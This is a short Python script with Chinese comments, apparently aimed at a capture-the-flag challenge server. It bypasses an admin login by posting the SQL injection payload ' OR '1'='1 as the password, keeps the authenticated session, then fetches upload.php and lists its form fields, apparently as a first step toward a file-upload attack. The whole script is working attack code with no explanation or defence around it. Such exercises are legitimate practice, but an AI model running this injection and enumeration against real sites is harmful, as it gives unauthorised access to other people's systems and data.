import requests
from bs4 import BeautifulSoup

base_url = "http://challenge.bluesharkinfo.com:28343"
login_url = f"{base_url}/admin/login.php"

# 创建session保持登录状态
session = requests.Session()

# SQL注入登录
print("=" * 60)
print("使用SQL注入登录...")
print("=" * 60)
data = {
    'username': 'admin',
    'password': "' OR '1'='1"
}
resp = session.post(login_url, data=data, allow_redirects=False)
print(f"登录响应状态: {resp.status_code}")
print(f"重定向到: {resp.headers.get('Location')}")
print(f"Cookies: {session.cookies.get_dict()}")
print("\n")

# 访问upload.php
print("=" * 60)
print("访问 upload.php...")
print("=" * 60)
resp = session.get(f"{base_url}/upload.php")
print(f"状态码: {resp.status_code}")
print(f"页面内容:")
print(resp.text)
print("\n")

# 解析页面看看有什么
soup = BeautifulSoup(resp.text, 'html.parser')
forms = soup.find_all('form')
print("=" * 60)
print("表单信息:")
print("=" * 60)
for form in forms:
    print(f"Action: {form.get('action')}")
    print(f"Method: {form.get('method')}")
    print(f"Enctype: {form.get('enctype')}")
    inputs = form.find_all('input')
    for inp in inputs:
        print(f"  Input: name={inp.get('name')}, type={inp.get('type')}")
